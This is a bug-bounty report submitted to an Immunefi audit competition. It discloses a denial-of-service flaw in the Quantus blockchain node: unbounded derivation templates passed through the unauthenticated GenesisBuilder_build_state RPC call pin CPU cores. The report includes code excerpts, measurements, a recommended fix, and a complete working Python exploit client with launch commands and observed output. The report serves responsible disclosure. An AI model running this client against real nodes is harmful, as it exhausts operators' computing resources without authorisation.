# 90408 bc medium quantus s safe rpc exposes genesisbuilder with unbounded derivation paths letting unauthenticated callers pin node cpu cores

**Submitted on Aug 24th 2026 at 21:20:46 UTC by @tinnohofficial for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #90408
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

## Brief/Intro

Quantus exports `GenesisBuilder_build_state` from its production runtime. An unauthenticated client can invoke it through the standard `state_call` RPC even when the node uses `--rpc-methods safe`.

The caller controls `devAccounts = (count, balance, derivation_template)`. Although Quantus caps the account count at 1,000, it does not bound the template's length, placeholder count, or derivation-path junctions. The runtime reparses that attacker-selected path for every account, making the work approximately `account count * junction count`.

An 8,739-byte request with 1,000 accounts and 1,000 short junctions occupied one core for about 6.7 seconds. Four clients raised the frozen node from approximately 100% to 500% process CPU while sending only about 5.2 KB/s. An 80,743-byte request ran for more than 60 seconds, and the work continued after the client disconnected.

The attack requires no account, signature, transaction fee, or high request rate and directly exceeds the selected 30% Medium node-resource threshold.

## Vulnerability Details

### `state_call` exposes the GenesisBuilder under the safe RPC policy

Quantus's production runtime exports the complete GenesisBuilder API:

```rust
impl sp_genesis_builder::GenesisBuilder<Block> for Runtime {
    fn build_state(config: Vec<u8>) -> sp_genesis_builder::Result {
        let (config, tech_collective_members) =
            crate::genesis_config_presets::prepare_genesis_build_input(config)?;
        build_state::<RuntimeGenesisConfig>(config)?;
        // ...
        Ok(())
    }
    // ...
}
```

See `runtime/src/apis.rs:323-340`.

The standard state RPC declares `state_call` as a blocking method that accepts an arbitrary runtime method name:

```rust
#[method(name = "state_call", aliases = ["state_callAt"], blocking)]
fn call(&self, name: String, bytes: Bytes, hash: Option<Hash>) -> Result<Bytes, Error>;
```

See `sc-rpc-api-0.54.0/src/state/mod.rs:34-39`.

Its implementation forwards directly to the runtime executor. Unlike `state_getPairs` immediately below it, `state_call` does not invoke `check_if_safe`:

```rust
fn call(&self, method: String, data: Bytes, block: Option<Block::Hash>) -> Result<Bytes, Error> {
    self.backend.call(block, method, data).map_err(Into::into)
}
```

See `sc-rpc-50.0.0/src/state/mod.rs:203-216`. `FullState::call` then executes the selected export at the best block using `CallContext::Offchain`: `sc-rpc-50.0.0/src/state/state_full.rs:197-210`.

The node executes this through `sc_executor::WasmExecutor<sp_io::SubstrateHostFunctions>` (`node/src/service.rs:556-560`). The overlay is discarded afterward, but the JSON parsing, key derivations, and storage writes have already consumed CPU.

The PoC invokes `GenesisBuilder_build_state` successfully on a publicly bound node using `--rpc-methods safe`; each call returns `"result":"0x00"`, the SCALE encoding of `Ok(())`. The default RPC configuration allows 15 MB requests and 100 connections, while per-connection rate limiting is disabled. The measured attack needed only four concurrent calls.

### The count cap still permits seconds of work from a 763-byte request

The existing mitigation caps only the account count:

```rust
if num_accounts > MAX_DEV_ACCOUNTS {
    return Err("num_accounts exceeds the maximum allowed dev accounts");
}
```

`MAX_DEV_ACCOUNTS` is 1,000 (`pallets/balances/src/lib.rs:200-208,1360-1376`). Even an ordinary 763-byte request at that limit took 1.70 seconds in the production Wasm executor. The PoC stays within this cap and increases work through the still-unbounded derivation template.

### The derivation template has unbounded multiplicative complexity

The genesis field contains an unrestricted `String`:

```rust
pub dev_accounts: Option<(u32, T::Balance, Option<String>)>,
```

See `pallets/balances/src/lib.rs:564-574`.

Validation requires only that this string contain at least one `{}`:

```rust
if !derivation.contains("{}") {
    return Err("invalid derivation, expected `{}` as part of the derivation");
}
```

For every one of the accepted 1,000 accounts, the runtime copies/replaces the whole string, reparses every path junction, performs the requested sr25519 derivations, and writes an account:

```rust
for index in 0..num_accounts {
    let derivation_string = derivation.replace("{}", &index.to_string());

    let pair: SrPair = Pair::from_string(&derivation_string, None)
        .map_err(|_| "Failed to parse derivation string")?;
    // ... storage mutation ...
}
```

See `pallets/balances/src/lib.rs:1384-1416`.

A template made from `"//{}" * n` is valid. Each repetition is parsed as another hard derivation junction, and every placeholder is replaced before parsing. Work is therefore approximately proportional to:

```
accepted account count * attacker-selected junction count
```

There is no bound on junction count, placeholder count, or template length other than the generic 15 MB outer RPC request limit. The PoC needs only 8,739 bytes per request.

Measured scaling on frozen HEAD:

| Request                                | Outer RPC bytes |      Live `build_state` duration |
| -------------------------------------- | --------------: | -------------------------------: |
| 1,000 accounts, ordinary template      |             763 |                           1.70 s |
| 1,000 accounts, 1,000 short junctions  |           8,739 | 6.58-6.81 s across repeated runs |
| 1,000 accounts, 10,000 short junctions |          80,743 |                   more than 60 s |
| 1,000 accounts, one 7 MB junction      |      14,000,755 |                          22.43 s |

The 14 MB request is accepted under the compiled 15 MB default. More importantly, the short-junction variant gives minute-scale work from only about 80 KB.

### Closing the client does not cancel the blocking runtime job

The 10,000-junction request exceeded the client's 60-second read timeout. Immediately after the client raised `Net::ReadTimeout` and closed its socket:

```
PID    %CPU  COMMAND
92804  198.0 ./target/debug/quantus-node ... --rpc-methods safe
```

The same node's normal local-mining baseline was approximately 100%. The extra core remained occupied after disconnect and disappeared only when the runtime call completed. A lightweight `state_call("Core_version", "0x")` still returned during this interval.

Consequently, an attacker does not need to retain long-lived response connections. Once the blocking work has been admitted, abandoning the HTTP request does not free the victim's CPU.

### Why this is not a duplicate

Quantus PR [#616](https://github.com/Quantus-Network/chain/pull/616) disclosed an unbounded **account count** and introduced `MAX_DEV_ACCOUNTS = 1_000`. This PoC never exceeds that limit. It exploits a separate unbounded input inside every accepted account: the derivation template's length and junction count. Limiting the number of loop iterations does not limit the work performed by each iteration.

The vulnerable combination is also Quantus-specific: its production runtime exports `GenesisBuilder_build_state`, routes it through `prepare_genesis_build_input`, and uses the custom balances `devAccounts` derivation loop.

## Impact Details

The attack targets any Quantus node exposing RPC, including nodes using `--rpc-methods safe`. It requires no account, authentication, signature, transaction fee, on-chain state, or mining power.

On an Apple M4 Pro host with 12 logical CPUs, frozen `quantus-node 0.8.0-exodus-3b243b870a5` showed:

```
idle/local-mining baseline: approximately 100% process CPU
attack:                    approximately 497-501% process CPU
increase from baseline:    approximately 400%
```

Four clients completed 12 requests in 20.275 seconds. Each request was 8,739 bytes and took 6.688-6.813 seconds, for approximately 5.2 KB/s of request payload. The measured increase therefore does not depend on brute-force traffic. Increasing the junction count lengthens each admitted job, and disconnecting does not cancel it.

The PoC did not shut down the whole network, and lightweight RPC calls could still be scheduled on the 12-core test host. For that reason this report selects the exact measured **Medium - Increasing network processing node resource consumption by at least 30% without brute force actions** impact rather than claiming High or Critical availability loss.

## Recommended Fix

Remove `GenesisBuilder_` exports from the remotely callable `state_call` namespace. Chain-spec tooling should use an internal client path rather than exposing genesis construction on a running node.

As defense in depth:

{% stepper %}
{% step %}

### Cap derivation-template complexity

Cap derivation-template bytes and path junctions, and permit exactly one `{}` placeholder.
{% endstep %}

{% step %}

### Limit total request execution

Reduce the account limit or enforce a total execution budget for the complete request.
{% endstep %}

{% step %}

### Cancel abandoned work

Cancel blocking runtime work when the client disconnects.
{% endstep %}

{% step %}

### Add regression coverage

Add a regression test through the production safe-RPC path.
{% endstep %}
{% endstepper %}

## References

* `runtime/src/apis.rs:323-340` - production `GenesisBuilder` runtime export.
* `runtime/src/genesis_config_presets.rs:458-495` - custom genesis-input parser.
* `pallets/balances/src/lib.rs:200-208` - account-count cap.
* `pallets/balances/src/lib.rs:564-620` - attacker-controlled genesis field and call into derivation.
* `pallets/balances/src/lib.rs:1360-1418` - count-only cap and multiplicative derivation loop.
* `node/src/service.rs:556-560` - production Wasm executor.
* `client/cli/src/config.rs:49-58` - 15 MB request and 100-connection defaults.
* `client/cli/src/params/rpc_params.rs:47-85` - public binding, safe method policy, and disabled-by-default rate limiting.
* `sc-rpc-api-0.54.0/src/state/mod.rs:34-39` - arbitrary blocking `state_call` declaration.
* `sc-rpc-50.0.0/src/state/mod.rs:203-216` - no safe-method check before forwarding the call.
* `sc-rpc-50.0.0/src/state/state_full.rs:197-210` - runtime executor invocation.

## Proof of Concept

## Environment

I reproduced these measurements on macOS; the same node and Python PoC run on Linux, where `top` or `pidstat` can be used to observe process CPU consumption.

No source modification is required.

{% stepper %}
{% step %}

### Build and launch a public safe-RPC development node

```bash
cargo build -p quantus-node

./target/debug/quantus-node \
  --dev \
  --tmp \
  --no-telemetry \
  --rpc-port 9944 \
  --rpc-external \
  --rpc-methods safe
```

{% endstep %}

{% step %}

### Save the CPU-exhaustion client

Save the exact tested client reproduced below as `04_genesis_builder_rpc_dos.py`. Its SHA-256 is recorded below.

```python
#!/usr/bin/env python3
import argparse
import concurrent.futures
import json
import time
import urllib.request


def compact_u32(value):
    if value < 1 << 6:
        return bytes([value << 2])
    if value < 1 << 14:
        return ((value << 2) | 1).to_bytes(2, "little")
    if value < 1 << 30:
        return ((value << 2) | 2).to_bytes(4, "little")
    raise ValueError("input is too large for this PoC")


def make_payload(junctions):
    config = {
        "system": {},
        "balances": {
            "balances": [],
            "devAccounts": [1000, 1_000_000_000, "//{}" * junctions],
        },
        "transactionPayment": {"multiplier": "1000000000000000000"},
        "qPoW": {"initialDifficulty": "0x3d0900"},
        "reversibleTransfers": {"initialHighSecurityAccounts": []},
        "treasuryPallet": {"treasuryAccount": None, "treasuryPortion": None},
        "vesting": {"schedules": []},
    }
    config_bytes = json.dumps(config, separators=(",", ":")).encode()
    call_data = compact_u32(len(config_bytes)) + config_bytes
    request = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "state_call",
        "params": ["GenesisBuilder_build_state", "0x" + call_data.hex()],
    }
    return json.dumps(request, separators=(",", ":")).encode()


def call(url, payload, timeout):
    request = urllib.request.Request(
        url,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    started = time.monotonic()
    with urllib.request.urlopen(request, timeout=timeout) as response:
        body = json.loads(response.read())
    elapsed = time.monotonic() - started
    if body.get("result") != "0x00":
        raise RuntimeError(body)
    return elapsed


def run_worker(url, payload, timeout, rounds):
    return [call(url, payload, timeout) for _ in range(rounds)]


parser = argparse.ArgumentParser()
parser.add_argument("--url", default="http://127.0.0.1:9944")
parser.add_argument("--workers", type=int, default=4)
parser.add_argument("--rounds", type=int, default=3)
parser.add_argument("--junctions", type=int, default=1000)
parser.add_argument("--timeout", type=float, default=180)
args = parser.parse_args()

payload = make_payload(args.junctions)
started = time.monotonic()
with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
    futures = [
        executor.submit(run_worker, args.url, payload, args.timeout, args.rounds)
        for _ in range(args.workers)
    ]
    durations = [duration for future in futures for duration in future.result()]
wall = time.monotonic() - started

print(
    json.dumps(
        {
            "request_bytes": len(payload),
            "junctions_per_account": args.junctions,
            "accounts_per_request": 1000,
            "successful_requests": len(durations),
            "wall_seconds": round(wall, 3),
            "min_request_seconds": round(min(durations), 3),
            "max_request_seconds": round(max(durations), 3),
            "requests_per_second": round(len(durations) / wall, 3),
        },
        indent=2,
    )
)
```

{% endstep %}

{% step %}

### Observe node CPU

In another terminal, observe the node's process CPU. On macOS:

```bash
PID=$(pgrep -n quantus-node)
top -l 24 -s 1 -pid "$PID" -stats pid,cpu,mem,rsize,time,threads
```

{% endstep %}

{% step %}

### Run the client

```bash
python3 04_genesis_builder_rpc_dos.py
```

Observed client output:

```json
{
  "request_bytes": 8739,
  "junctions_per_account": 1000,
  "accounts_per_request": 1000,
  "successful_requests": 12,
  "wall_seconds": 20.275,
  "min_request_seconds": 6.688,
  "max_request_seconds": 6.813,
  "requests_per_second": 0.592
}
```

Observed node samples while those four workers were active:

```
PID    %CPU  #TH
87636  499.9 63/5
87636  499.4 63/5
87636  498.0 63/5
87636  500.7 63/5
87636  497.5 63/5
```

Immediately after the clients completed, the same process returned to its local-mining baseline:

```
PID    %CPU  #TH
87636  100.1 63/1
87636  100.0 63/1
87636  100.0 63/1
```

All 12 unauthenticated runtime calls returned success. The only attacker traffic was 12 bodies of 8,739 bytes over approximately 20 seconds.
{% endstep %}
{% endstepper %}

## Long-running call and disconnect persistence

One worker with 10,000 junctions creates an 80,743-byte request:

```bash
python3 04_genesis_builder_rpc_dos.py \
  --workers 1 \
  --rounds 1 \
  --junctions 10000 \
  --timeout 60
```

The client times out after 60 seconds. Monitoring the node after the exception shows it still using one extra full CPU core until `GenesisBuilder_build_state` finishes. This demonstrates that a client can abandon admitted work rather than paying for a long-lived connection.

Stop the local node after testing:

```bash
kill "$(pgrep -n quantus-node)"
```
